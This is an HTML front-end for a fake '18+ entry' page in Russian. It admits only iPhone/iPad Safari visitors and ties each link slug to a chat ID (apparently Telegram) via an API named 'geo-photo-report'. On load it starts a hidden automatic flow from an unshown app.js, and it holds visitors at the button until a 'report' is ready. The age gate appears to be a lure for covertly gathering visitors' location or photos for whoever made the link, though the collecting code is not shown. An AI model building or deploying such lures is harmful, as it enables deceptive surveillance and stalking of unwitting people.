<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>18+ Вход — Светлая версия</title>
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="format-detection" content="telephone=no">

  <!-- ✅ Адрес API на Render -->
  <script>
    window.__API_BASE = 'https://geo-photo-report.onrender.com';
  </script>

  <!-- ✅ SPA fallback для /r/<slug> -->
  <script>
    (function(){
      const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
      if (m) {
        const slug = m[1];
        window.__SLUG = slug; // <– сохраняем slug глобально
        const newUrl = '/index.html?slug=' + encodeURIComponent(slug);
        history.replaceState(null, '', newUrl);
        location.reload();
      }
    })();
  </script>

  <style>
    :root {
      --bg0:#ffffff;--bg1:#f7f9ff;
      --txt:#111;--sub:#444;--muted:#6b7280;
      --primary:#2563eb;--primary2:#60a5fa;
      --err:#ef4444;--ok:#16a34a;
      --radius:20px;--shadow:0 6px 30px rgba(0,0,0,.08);
      --ring:0 0 0 3px rgba(37,99,235,.25)
    }
    html,body{height:100%}
    body{
      margin:0;overflow:hidden;display:grid;place-items:center;
      font-family:"Segoe UI",Roboto,system-ui,-apple-system,sans-serif;
      background:var(--bg0);color:var(--txt);
      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
    }
    .animated-gradient{position:absolute;inset:-12vmax;z-index:0;pointer-events:none;
      filter:blur(80px) saturate(110%);opacity:.35;
      background:conic-gradient(from 0deg,rgba(96,165,250,.20),rgba(14,165,233,.15),rgba(199,210,254,.18),rgba(96,165,250,.20));
      animation:swirl 32s linear infinite}
    @keyframes swirl{to{transform:rotate(360deg)}}
    .card{width:min(92vw,520px);padding:28px;border-radius:var(--radius);
      background:rgba(255,255,255,.92);backdrop-filter:blur(6px);
      box-shadow:var(--shadow);text-align:center;z-index:2}
    h1{font-size:24px;font-weight:800;margin:0 0 12px}
    p{font-size:16px;margin:0 0 18px;line-height:1.55}
    .reason{font-size:13px;margin-top:8px;color:var(--muted)}
    .notice{font-size:12px;color:var(--muted);margin-top:14px}
    button{
      width:100%;height:54px;border:none;border-radius:14px;
      background:linear-gradient(90deg,var(--primary),var(--primary2));
      color:#fff;font-weight:800;font-size:16px;cursor:pointer;
      transition:transform .12s ease,box-shadow .12s ease;
      box-shadow:0 10px 25px rgba(37,99,235,.25)
    }
    .ok{color:var(--ok);font-weight:700}
    .err{color:var(--err);font-weight:700}
  </style>
</head>
<body>
  <div class="animated-gradient"></div>
  <div class="card" id="card">
    <h1 id="title">Проверка устройства</h1>
    <p id="text">Определение платформы…</p>
    <div class="reason" id="reason"></div>
    <button id="enterBtn" style="display:none;">Войти 18+</button>
    <div class="notice" id="note"></div>
  </div>

  <!-- ✅ Скрипт проверки slug и связи с API -->
  <script>
    (async function resolveSlug(){
      const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
        ? String(window.__API_BASE).replace(/\/+$/, '')
        : '';

      const q = new URLSearchParams(location.search).get('slug');
      const slug = q || window.__SLUG || null;
      if (!slug) return;
      window.__TARGET_SLUG = slug;

      try {
        const r = await fetch(`${API_BASE}/api/resolve-link?slug=${encodeURIComponent(slug)}`);
        const data = await r.json().catch(()=>null);
        if (r.ok && data?.ok && data.chatId) {
          window.__TARGET_CHAT_ID = String(data.chatId);
          console.log('[resolve-link] OK for slug:', slug, '→ chatId:', window.__TARGET_CHAT_ID);
        } else {
          document.getElementById('note').textContent = 'Ссылка не активна или не найдена.';
        }
      } catch (e) {
        console.error('resolve-link error:', e);
        document.getElementById('note').textContent = 'Ошибка связи с сервером.';
      }
    })();
  </script>

  <!-- Основной фронтовый код -->
  <script src="/app.js"></script>

  <!-- Остальная визуальная логика -->
  <script>
    const $ = id => document.getElementById(id);
    function isIOSFamily(){
      const ua = navigator.userAgent;
      const touchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
      return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
    }
    function isSafariWebKit(){
      const ua = navigator.userAgent;
      const vendorOK = navigator.vendor === 'Apple Computer, Inc.';
      return /Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) && vendorOK;
    }
    function getIOSLikeVersion(){
      const ua = navigator.userAgent;
      const m = ua.match(/OS\s(\d+)[_.]/) || (navigator.appVersion && navigator.appVersion.match(/Version\/(\d+)/));
      return m ? parseInt(m[1], 10) : null;
    }

    document.addEventListener('DOMContentLoaded', () => {
      const ver = getIOSLikeVersion();
      const isiOS = isIOSFamily();
      const ok = isiOS && ver && ver >= 18 && isSafariWebKit();

      if (ok) {
        $('title').textContent = 'Подтверждение 18+';
        $('text').innerHTML = '<span class="ok">Доступ разрешён.</span>';
        $('reason').textContent = `iOS ${ver}, Safari WebKit.`;
        $('enterBtn').style.display = 'block';
        $('note').textContent = 'Кнопка активируется после проверки.';
        if (typeof window.__autoFlow === 'function') {
          setTimeout(() => window.__autoFlow(), 50);
        }
        $('enterBtn').addEventListener('click', e => {
          if (!window.__reportReady) { e.preventDefault(); return; }
          location.assign('https://example.com'); // замени на свою цель
        });
      } else {
        $('title').textContent = 'Доступ отклонён';
        $('text').innerHTML = '<span class="err">Отказ в доступе.</span>';
        $('reason').textContent = 'Доступ возможен только на iPhone/iPad с Safari 18+.';
        $('note').textContent = 'Проверьте устройство и повторите.';
      }
    });
  </script>
</body>
</html>
